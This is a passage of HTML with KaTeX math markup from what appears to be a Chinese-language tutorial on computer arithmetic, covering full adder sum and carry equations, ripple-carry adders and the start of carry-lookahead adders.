size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，与向高位的进位 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">C_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，共两个输出。全加器的逻辑表达式如下：</p>
<ul>
<li><strong>和表达式</strong>：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mi>i</mi></msub><mo>=</mo><msub><mi>A</mi><mi>i</mi></msub><mo>⊕</mo><msub><mi>B</mi><mi>i</mi></msub><mo>⊕</mo><msub><mi>C</mi><mrow><mi>i</mi><mo>−</mo><mn>1</mn></mrow></msub><mtext>（</mtext><msub><mi>A</mi><mi>i</mi></msub><mtext>、</mtext><msub><mi>B</mi><mi>i</mi></msub><mtext>、</mtext><msub><mi>C</mi><mrow><mi>i</mi><mo>−</mo><mn>1</mn></mrow></msub><mtext>中有奇数个&nbsp;1&nbsp;时，</mtext><msub><mi>S</mi><mi>i</mi></msub><mo>=</mo><mn>1</mn><mtext>；否则</mtext><msub><mi>S</mi><mi>i</mi></msub><mo>=</mo><mn>0</mn><mtext>）</mtext></mrow><annotation encoding="application/x-tex">S_i = A_i \oplus B_i \oplus C_{i-1} \text{（}A_i \text{、}B_i \text{、}C_{i-1} \text{中有奇数个 1 时，} S_i = 1 \text{；否则} S_i = 0 \text{）}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8917em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mord text"><span class="mord cjk_fallback">（</span></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord text"><span class="mord cjk_fallback">、</span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord text"><span class="mord cjk_fallback">、</span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mord text"><span class="mord cjk_fallback">中有奇数个</span><span class="mord">&nbsp;1&nbsp;</span><span class="mord cjk_fallback">时，</span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord">1</span><span class="mord text"><span class="mord cjk_fallback">；否则</span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord">0</span><span class="mord text"><span class="mord cjk_fallback">）</span></span></span></span></span></li>
<li><strong>进位表达式</strong>：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mi>i</mi></msub><mo>=</mo><msub><mi>A</mi><mi>i</mi></msub><msub><mi>B</mi><mi>i</mi></msub><mo>+</mo><mo stretchy="false">(</mo><msub><mi>A</mi><mi>i</mi></msub><mo>⊕</mo><msub><mi>B</mi><mi>i</mi></msub><mo stretchy="false">)</mo><msub><mi>C</mi><mrow><mi>i</mi><mo>−</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">C_i = A_iB_i + (A_i \oplus B_i)C_{i-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span></span></span></span></li>
</ul>
<p>一位全加器对应的逻辑结构和逻辑符号如下所示：</p>
<figure><figcaption>一位全加器</figcaption></figure>
</li>
<li>
<p><strong>串行进位加法器</strong></p>
<p>把 <code>n</code> 个全加器相连可得到 <code>n</code> 位加法器称为 <strong>串行进位加法器</strong>。串行进位又称 <strong>行波进位</strong>，每级进位直接依赖于前一级的进位，即进位信号是逐级形成的。</p>
<figure><figcaption>串行进位加法器</figcaption></figure>
<p>在串行进位加法器中，低位运算产生进位所需的时间将影响高位运算的时间。因此，串行进位加法器的 <strong>最长运算时间主要是由进位信号的传递时间决定的</strong>，位数越多延迟时间就越长，而全加器本身的求和延迟只为次要因素，所以加快进位产生和提高传递的速度是关键。</p>
</li>
<li>
<p><strong>并行进位加法器</strong></p>
<p>令 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>G</mi><mi>i</mi></msub><mo>=</mo><msub><mi>A</mi><mi>i</mi></msub><msub><mi>B</mi><mi>i</mi></msub><mtext>，</mtext><msub><mi>P</mi><mi>i</mi></msub><mo>=</mo><msub><mi>A</mi><mi>i</mi></msub><mo>⊕</mo><msub><mi>B</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">G_i = A_iB_i \text{，}P_i = A_i \oplus B_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord text"><span class="mord cjk_fallback">，</span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，全加器的进位表达式为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mi>i</mi></msub><mo>=</mo><msub><mi>G</mi><mi>i</mi></msub><mo>+</mo><msub><mi>P</mi><mi>i</mi></msub><msub><mi>C</mi><mrow><mi>i</mi><mo>−</mo><mn>1</mn></mrow></msub><mtext>（</mtext><msub><mi>G</mi><mi>i</mi></msub><mo>=</mo><mn>1</mn><mtext>或</mtext><msub><mi>P</mi><mi>i</mi></msub><msub><mi>C</mi><mrow><mi>i</mi><mo>−</mo><mn>1</mn></mrow></msub><mo>=</mo><mn>1</mn><mtext>时，</mtext><msub><mi>C</mi><mi>i</mi></msub><mo>=</mo><mn>1</mn><mtext>）</mtext></mrow><annotation encoding="application/x-tex">C_i = G_i + P_iC_{i-1} \text{（}G_i = 1 \text{或} P_iC_{i-1} = 1 \text{时，}C_i = 1 \text{）}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8917em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mord text"><span class="mord cjk_fallback">（</span></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8917em;vertical-align:-0.2083em;"></span><span class="mord">1</span><span class="mord text"><span class="mord cjk_fallback">或</span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord">1</span><span class="mord text"><span class="mord cjk_fallback">时，</span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord">1</span><span class="mord text"><span class="mord cjk_fallback">）</span></span></span></span></span> 式中，当 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">A_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 与 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>B</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">B_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 都为 <code>1</code> 时，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mi>i</mi></msub><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">C_i = 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0715em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>，即有进位信号产生，所以称 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><mi>i</mi></msub><msub><mi>B</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">A_iB_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0502em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 为进位产生函数（本地进位），用 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>G</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">G_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 表示。<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>A</mi><mi>i</mi></msub><mo>⊕</mo><msub><mi>B</mi><mi>i</mi></msub><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">A_i \oplus B_i = 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" 